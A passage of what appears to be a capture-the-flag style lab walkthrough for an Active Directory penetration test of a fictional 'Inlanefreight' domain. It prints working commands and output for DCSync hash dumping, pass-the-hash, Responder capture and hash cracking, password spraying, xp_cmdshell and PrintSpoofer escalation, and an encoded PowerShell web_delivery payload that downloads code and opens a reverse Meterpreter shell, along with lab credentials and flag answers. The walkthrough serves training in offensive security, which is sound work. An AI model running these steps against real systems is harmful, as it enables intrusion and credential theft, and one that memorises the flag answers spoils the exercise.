SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

`DCSync` rights

Perform a DCSync attack to obtain the hash for for administrator on DC01:

```
proxychains sudo secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49667-<><>-OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a76102a5617bffb1ea84ba0052767992823fd414697e81151f7de21bb41b1857
Administrator:aes128-cts-hmac-sha1-96:69e27df2550c5c270eca1d8ce5c46230
Administrator:des-cbc-md5:c2d9c892f2e6f2dc
[*] Cleaning up...
```


Use wmiexec.py as administrator and pass the hash aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 
to be able to connect to DC01. The flag is in C:\users\administrator\desktop\flag.txt:

```
proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0

ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC01

C:\>type c:\users\administrator\desktop\flag.txt
r3plicat1on_m@st3r!
```

## II 
## Engagement

Our client Inlanefreight has contracted us again to perform a full-scope internal penetration test. The client is looking to find and remediate as many flaws as possible before going through a merger & acquisition process. The new CISO is particularly worried about more nuanced AD security flaws that may have gone unnoticed during previous penetration tests. The client is not concerned about stealth/evasive tactics and has also provided us with a Parrot Linux VM within the internal network to get the best possible coverage of all angles of the network and the Active Directory environment. Connect to the internal attack host via SSH (you can also connect to it using xfreerdp as shown in the beginning of this module) and begin looking for a foothold into the domain. Once you have a foothold, enumerate the domain and look for flaws that can be utilized to move laterally, escalate privileges, and achieve domain compromise.


## Objectives

- Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?
- What is this user's cleartext password?
- Submit the contents of the C:\flag.txt file on MS01.
- Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.
- What is this user's password?
- Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?
- Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.
- Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.
- Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?
- Crack this user's password hash and submit the cleartext password as your answer.
- Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.
- Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.

```
ssh htb-student@10.129.118.236
The authenticity of host '10.129.118.236 (10.129.118.236)' can't be established.
ED25519 key fingerprint is SHA256:V725mj/gY+cKN6lWeODp9siHpvL9GMNLqiuvihxvP+8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.118.236' (ED25519) to the list of known hosts.
htb-student@10.129.118.236's password: 
Linux skills-par01 5.15.0-15parrot1-amd64 #1 SMP Debian 5.15.15-15parrot2 (2022-02-15) x86_64
 ____                      _     ____            
|  _ \ __ _ _ __ _ __ ___ | |_  / ___|  ___  ___ 
| |_) / _` | '__| '__/ _ \| __| \___ \ / _ \/ __|
|  __/ (_| | |  | | | (_) | |_   ___) |  __/ (__ 
|_|   \__,_|_|  |_|  \___/ \__| |____/ \___|\___|
                                                 



The programs included with the Parrot GNU/Linux are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Parrot GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Apr  9 18:29:27 2022 from 10.10.14.15
┌─[htb-student@skills-par01]─[~]
└──╼ $

```


Run Responder to try and attempt to steal hashes:

```
sudo responder -I ens224 -wrfv
```

<img width="1024" height="693" alt="image" src="https://github.com/user-attachments/assets/77cf448a-fed7-42ed-bd21-1c6f2f0ba11d" />

user: `AB920`

Crack the NTMLv2 hash with hashcat:

```
sudo nano hash.txt

AB920::INLANEFREIGHT:db01ff67bf1dc695:B0A7BB024D6888223F7F227F89535B4A:01010000000000000099E359482BDC016161976174AA9B420000000002000800360036004F004D0001001E00570049004E002D0048004C0046005800500056004D004D0053003400540004003400570049004E002D0048004C0046005800500056004D004D005300340054002E00360036004F004D002E004C004F00430041004C0003001400360036004F004D002E004C004F00430041004C0005001400360036004F004D002E004C004F00430041004C00070008000099E359482BDC0106000400020000000800300030000000000000000000000000200000FBD902463033367F18EDE2FDB5636A11E532B4AD68BDD191DC9C380D5A3937DD0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000

```

```
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================

AB920::INLANEFREIGHT:7691a9c9f2e8e9c3:b103ceb4bd6a0d624c7b9d3bba2de97a:01010000000000000099e359482bdc014cf1412d9a453cfe0000000002000800360036004f004d0001001e00570049004e002d0048004c0046005800500056004d004d0053003400540004003400570049004e002d0048004c0046005800500056004d004d005300340054002e00360036004f004d002e004c004f00430041004c0003001400360036004f004d002e004c004f00430041004c0005001400360036004f004d002e004c004f00430041004c00070008000099e359482bdc0106000400020000000800300030000000000000000000000000200000fbd902463033367f18ede2fdb5636a11e532b4ad68bdd191dc9c380d5a3937dd0a0010000000000000000000000000000000000009002e0063006900660073002f0049004e004c0041004e0045004600520049004700480054002e004c004f00430041004c00000000000000000000000000:weasal
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: AB920::INLANEFREIGHT:7691a9c9f2e8e9c3:b103ceb4bd6a0...000000
Time.Started.....: Sun Sep 21 21:44:03 2025 (0 secs)
Time.Estimated...: Sun Sep 21 21:44:03 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  1882.9 kH/s (0.84ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 290816/14344385 (2.03%)
Rejected.........: 0/290816 (0.00%)
Restore.Point....: 288768/14344385 (2.01%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: winers -> temyong

Started: Sun Sep 21 21:43:55 2025
Stopped: Sun Sep 21 21:44:04 2025
┌─[eu-academy-5]─[10.10.14.50]─[htb-ac-943240@htb-yt9uk7eejp]─[~]
└──╼ [★]$ 

```

password: `weasal`

Run Nmap to discover more hosts in the 172.16.7.0/24 subnet:

```
┌─[htb-student@skills-par01]─[~]
└──╼ $sudo nmap -p 88,445,3389 --open 172.16.7.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-21 22:46 EDT
Nmap scan report for inlanefreight.local (172.16.7.3)
Host is up (0.0017s latency).
Not shown: 1 closed tcp port (reset)
PORT    STATE SERVICE
88/tcp  open  kerberos-sec
445/tcp open  microsoft-ds
MAC Address: 00:50:56:94:DE:62 (VMware)

Nmap scan report for 172.16.7.50
Host is up (0.0021s latency).
Not shown: 1 closed tcp port (reset)
PORT     STATE SERVICE
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
MAC Address: 00:50:56:94:E9:0A (VMware)

Nmap scan report for 172.16.7.60
Host is up (0.0017s latency).
Not shown: 2 closed tcp ports (reset)
PORT    STATE SERVICE
445/tcp open  microsoft-ds
MAC Address: 00:50:56:94:30:22 (VMware)

Nmap scan report for 172.16.7.240
Host is up (0.0012s latency).
Not shown: 2 closed tcp ports (reset)
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 256 IP addresses (4 hosts up) scanned in 27.94 seconds
```

Three hosts = 

`172.16.7.3`
`172.16.7.50`
`172.16.7.60`

Enumerate using bloodhound:

```
bloodhound-python -d INLANEFREIGHT.LOCAL -ns 172.16.7.3 -c All -u AB920 -p weasal
```
<img width="1019" height="668" alt="image" src="https://github.com/user-attachments/assets/a5db1e69-0a71-4ec2-af92-c356324ef32f" />

Enumerate further, running Nmap against 172.16.7.50:

```
[htb-student@skills-par01]─[~]
└──╼ $nmap -A 172.16.7.50
Starting Nmap 7.92 ( https://nmap.org ) at 2025-09-21 22:50 EDT
Nmap scan report for 172.16.7.50
Host is up (0.043s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-09-22T02:51:07+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=MS01.INLANEFREIGHT.LOCAL
| Not valid before: 2025-09-21T02:33:09
|_Not valid after:  2026-03-23T02:33:09
| rdp-ntlm-info: 
|   Target_Name: INLANEFREIGHT
|   NetBIOS_Domain_Name: INLANEFREIGHT
|   NetBIOS_Computer_Name: MS01
|   DNS_Domain_Name: INLANEFREIGHT.LOCAL
|   DNS_Computer_Name: MS01.INLANEFREIGHT.LOCAL
|   DNS_Tree_Name: INLANEFREIGHT.LOCAL
|   Product_Version: 10.0.17763
|_  System_Time: 2025-09-22T02:51:02+00:00
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-22T02:51:02
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: MS01, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:94:e9:0a (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.48 seconds
```

Connect to MS01 using RDP, having the opportunity to use drive redirection:

Reconnect forwarding X11 over ssh
```
ssh -X htb-student@<htb-box>
```
------>
```
┌─[htb-student@skills-par01]─[~]
└──╼ $xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:share,/home/htb-student/Desktop /dynamic-resolution
```

<img width="1265" height="786" alt="image" src="https://github.com/user-attachments/assets/7d31fa37-3dcb-483b-9a34-a15e187c7ec8" />

ParrotOS jump-box will be accessible as a file share on MS01:

<img width="760" height="344" alt="image" src="https://github.com/user-attachments/assets/3548489a-6b51-4b68-813a-02a42ef388c1" />

<img width="1273" height="752" alt="image" src="https://github.com/user-attachments/assets/3e8799d2-c075-4a3c-8d01-856f6786c950" />


Use PowerView and Kerbrute from MS01:

```
wget -q https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe
```

<img width="1018" height="200" alt="image" src="https://github.com/user-attachments/assets/93921589-01de-4b31-a9be-67bba36425d7" />
<img width="1011" height="152" alt="image" src="https://github.com/user-attachments/assets/67376177-70df-45cc-9ca8-42bd5c743588" />

Using the previously established RDP session on MS01, use the shared drive in File Explorer and transfer PowerView.ps1 and Kerbrute to the Desktop:

<img width="768" height="345" alt="image" src="https://github.com/user-attachments/assets/e944d04d-8bbd-4072-b9e6-795372db3ace" />

In powershell execute the following:

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\AB920> cd .\Desktop\
PS C:\Users\AB920\Desktop> Set-ExecutionPolicy Bypass -Scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
PS C:\Users\AB920\Desktop> Import-Module .\PowerView.ps1
PS C:\Users\AB920\Desktop> Get-DomainUser * | Select-Object -ExpandProperty samaccountname | Foreach {$_.TrimEnd()} |Set-Content adusers.txt

PS C:\Users\AB920\Desktop> Get-Content .\adusers.txt | select -First 10

Administrator
Guest
krbtgt
NY340
RO050
FF479
EU303
SX681
AJ725
PH432
```

Use kerbrute.exe to password spray against the user list generated:

```
PS C:\Users\AB920\Desktop> .\kerbrute_windows_amd64.exe passwordspray -d INLANEFREIGHT.LOCAL .\adusers.txt Welcome1

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/29/22 - Ronnie Flathers @ropnop

2022/11/29 10:42:57 >  Using KDC(s):
2022/11/29 10:42:57 >   DC01.INLANEFREIGHT.LOCAL:88
2022/11/29 10:43:15 >  [+] VALID LOGIN:  BR086@INLANEFREIGHT.LOCAL:Welcome1  <----------------------
2022/11/29 10:43:15 >  Done! Tested 2901 logins (1 successes) in 18.733 seconds
PS C:\Users\AB920\Desktop>
```

user : `BR086`  password: `Welcome1`


Run Snaffler.exe on MS01 to hunt for shares (It must be downloaded to Pwnbox and then transferred to the Parrot OS jump-box):

```
wget -q https://github.com/SnaffCon/Snaffler/releases/download/1.0.16/Snaffler.exe
scp Snaffler.exe htb-student@STMIP:/home/htb-student/Desktop
```

From MS01 use the shared drive to move Snaffler.exe to the Desktop.

Using the previously established PowerShell session, use runas to launch a new PowerShell session as the BR086 user:

```
PS C:\Users\AB920\Desktop> runas /netonly /user:INLANEFREIGHT\BR086 powershell

Enter the password for INLANEFREIGHT\BR086:

Attempting to start powershell as user "INLANEFREIGHT\BR086" ...
```

Run Snaffler.exe to find a SQL connection string in a web.config file:

```
PS C:\Windows\System32>cd C:\users\AB920\Desktop
PS C:\users\AB920\Desktop>.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data

 .::::::.:::.    :::.  :::.    .-:::::'.-:::::':::    .,:::::: :::::::..
;;;`    ``;;;;,  `;;;  ;;`;;   ;;;'''' ;;;'''' ;;;    ;;;;'''' ;;;;``;;;;
'[==/[[[[, [[[[[. '[[ ,[[ '[[, [[[,,== [[[,,== [[[     [[cccc   [[[,/[[['
  '''    $ $$$ 'Y$c$$c$$$cc$$$c`$$$'`` `$$$'`` $$'     $$""   $$$$$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\Department Shares>(R) Share for department users
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\NETLOGON>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:10Z [Share] {Green}<\\DC01.INLANEFREIGHT.LOCAL\SYSVOL>(R) Logon server share
[INLANEFREIGHT\AB920@MS01] 2022-04-21 21:25:11Z [File] {Yellow}<KeepDbConnStringPw|R|connectionstring.{1,200}passw|1.2kB|2022-04-01 15:04:05Z>(\\DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Private\Development\web.config) etEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS;database=master;Integrated\ Security=SSPI;Pooling=true"/>\ \n\ \ \ \ \ \ \ </masterDataServices>\ \ \n\ \ \ \ \ \ \ <connectionStrings>\n\ \ \ \ \ \ \ \ \ \ \ <add\ name="ConString"\ connectionString="Environment\.GetEnvironmentVariable\("computername"\)\+'\\SQLEXPRESS';Initial\ Catalog=Northwind;User\ ID=netdb;Password=D@ta_bAse_adm1n!"/>\n\ \ \ \ \ \ \ </connectionStrings>\n\ \ </system\.web>\n</co
```

info = `netdb;Password=D@ta_bAse_adm1n!`

Use mssqlclient.py to connect to the MSSQL database at 172.16.7.60:

<img width="1040" height="436" alt="image" src="https://github.com/user-attachments/assets/6d58c7e4-70f4-43dd-9673-6db5fea5e97f" />

enable xp_cmdshell

<img width="1034" height="193" alt="image" src="https://github.com/user-attachments/assets/16f80ff8-59d6-4739-9acf-8b44709b4051" />

Check the user's privileges to discover that SeImpersonatePrivilege is enabled:

```
SQL> xp_cmdshell whoami /priv

output                                                                             

PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      

============================= ========================================= ========   

SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Escalate privileges using PrintSpoofer. Transfer the PrintSpoofer64.exe from Pwnbox to the Parrot OS jump-box:


```
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
scp PrintSpoofer64.exe htb-student@STMIP:/home/htb-student/Desktop
```
<img width="1041" height="177" alt="image" src="https://github.com/user-attachments/assets/6e24702d-1159-4b44-a347-31ec8e208228" />

Start a web server from the skills-par01 jump-box; after transferring the printspooler from above -> use in the previous xp_cmdshell + ssh into new session
and host webserver to grab:

<img width="1035" height="192" alt="image" src="https://github.com/user-attachments/assets/7565ceab-399f-4671-b403-dfee1ad6fea2" />

+
```
SQL> xp_cmdshell certutil -urlcache -split -f "http://172.16.7.240:9000/PrintSpoofer64.exe" c:\windows\temp\PrintSpoofer64.exe
output                                                                             

--------------------------------------------------------------------------------   

****  Online  ****                                                                 

  0000  ...                                                                        

  6a00                                                                             

CertUtil: -URLCache command completed successfully.                                

NULL                                                                               

SQL> 
```

Use PrintSpoofer.exe to run commands as SYSTEM. Change the password for the current local administrator (setting it to Welcome1 in here):

```
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "net user administrator Welcome1"
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                                                                               

```

-->

```
smbclient -U "administrator" \\\\172.16.7.60\\C$
Enter WORKGROUP\administrator's password: 
Try "help" to get a list of possible commands.
smb: \> cd Users\Administrator\Desktop\
get flag.txt
exit
cat flag.txt
smb: \Users\Administrator\Desktop\> ls
  .                                  DR        0  Mon Apr 11 23:32:59 2022
  ..                                 DR        0  Mon Apr 11 23:32:59 2022
  desktop.ini                       AHS      282  Fri Apr  1 11:36:27 2022
  flag.txt                            A       21  Mon Apr 11 23:33:06 2022

		7706623 blocks of size 4096. 4211715 blocks available
smb: \Users\Administrator\Desktop\> get flag.txt
getting file \Users\Administrator\Desktop\flag.txt of size 21 as flag.txt (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
smb: \Users\Administrator\Desktop\> exit
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $ cat flag.txt
s3imp3rs0nate_cl@ssic┌─[htb-student@skills-par01]─[~/Desktop]
```
flag = `s3imp3rs0nate_cl@ssic`

Meterpreter web_delivery payload from the ParrotOS jump-box:

```
search web_delivery

Matching Modules
================

   #   Name                                                        Disclosure Date  Rank       Check  Description
   -   ----                                                        ---------------  ----       -----  -----------
   0   exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1     \_ target: Automatic                                      .                .          .      .
   2     \_ target: Unix/OSX/Linux                                 .                .          .      .
   3     \_ target: Windows - PowerShell (In-Memory)               .                .          .      .
   4     \_ target: Windows (CMD)                                  .                .          .      .
   5   exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery  <----- 
   6     \_ target: Python                                         .                .          .      .
   7     \_ target: PHP                                            .                .          .      .
   8     \_ target: PSH                                            .                .          .      .
   9     \_ target: Regsvr32                                       .                .          .      .
   10    \_ target: pubprn                                         .                .          .      .
   11    \_ target: SyncAppvPublishingServer                       .                .          .      .
   12    \_ target: PSH (Binary)                                   .                .          .      .
   13    \_ target: Linux                                          .                .          .      .
   14    \_ target: Mac OS X                         

```
```
sudo msfconsole -q
search web_delivery
use 5
set payload windows/x64/meterpreter/reverse_tcp
set TARGET 2
set SRVHOST 172.16.7.240
set LHOST 172.16.7.240
exploit
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $sudo msfconsole -q

[msf](Jobs:0 Agents:0) >> search web_delivery

Matching Modules
================

   #  Name                                                        Disclosure Date  Rank       Check  Description
   -  ----                                                        ---------------  ----       -----  -----------
   0  exploit/multi/postgres/postgres_copy_from_program_cmd_exec  2019-03-20       excellent  Yes    PostgreSQL COPY FROM PROGRAM Command Execution
   1  exploit/multi/script/web_delivery                           2013-07-19       manual     No     Script Web Delivery


Interact with a module by name or index. For example info 1, use 1 or use exploit/multi/script/web_delivery

[msf](Jobs:0 Agents:0) >> use 1
[*] Using configured payload python/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set TARGET 2
TARGET => 2
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set SRVHOST 172.16.7.240
SRVHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> set LHOST 172.16.7.240
LHOST => 172.16.7.240
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.7.240:4444 
[*] Using URL: http://172.16.7.240:8080/za1FaPR8o
[*] Server started.
[*] Run the following command on the target machine:
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA
```

Run the encoded PowerShell payload from the xp_cmdshell PrintSpoofer:

```
SQL> xp_cmdshell c:\windows\temp\PrintSpoofer64.exe -c "powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABzAGQAawBfAEoAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAcwBkAGsAXwBKAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAcwBkAGsAXwBKAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAxADYALgA3AC4AMgA0ADAAOgA4ADAAOAAwAC8AegBhADEARgBhAFAAUgA4AG8ALwBhAGIAWQBHADEAagA4AHIAegByAHkATQB4AFEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                                                                               

SQL> 

```

Meterpreter session verifying SYSTEM privileges:

```
[*] 172.16.7.60      web_delivery - Delivering AMSI Bypass (1375 bytes)
[*] 172.16.7.60      web_delivery - Delivering Payload (3692 bytes)
[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.60:53991 ) at 2022-11-29 13:06:07 -0500

[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > shell
Process 4076 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

nt authority\system
```

Using the privileges of the super user,  extract passwords from memory using mimikatz.exe after transferring to the jump-box:

```
